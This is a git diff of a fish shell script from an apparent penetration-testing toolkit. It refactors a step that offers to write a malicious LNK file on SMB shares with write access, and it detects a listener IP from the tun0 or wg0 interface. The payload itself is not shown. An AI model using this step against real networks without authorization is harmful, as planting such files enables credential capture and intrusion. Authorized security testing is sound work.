@@ -225,17 +225,23 @@ Examples:
         }')
 
         if test -n "$write_shares"
-            ezpz_question "Write malicious LNK file on shares with WRITE permission? [y/N]: "
-            if test (ezpz_confirm) -eq 0
-                # Extract tun0 IP address
-                set arch (ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
-                
-                ezpz_question "Enter listener IP address:"
-                set listener (ezpz_input $arch)
-                if test -z "$listener"
-                    set listener $arch
+            if ezpz_confirm "Write malicious LNK file on shares with WRITE permission?"
+                # Prefer tun0, fall back to wg0, then to $arch from the box env.
+                set -l listener_ip ""
+                for iface in tun0 wg0
+                    set listener_ip (ip -4 addr show $iface 2>/dev/null | awk '/inet /{print $2; exit}' | cut -d/ -f1)
+                    test -n "$listener_ip"; and break
                 end
-                
+                if test -z "$listener_ip"; and set -q arch
+                    set listener_ip $arch
+                end
+
+                ezpz_question "Enter listener IP address:"
+                set listener (ezpz_input $listener_ip)
+                if test -z "$listener"
+                    set listener $listener_ip
+                end
+
                 if test -z "$listener"
                     ezpz_warn "Could not determine listener IP address. Skipping LNK file creation."
                 else
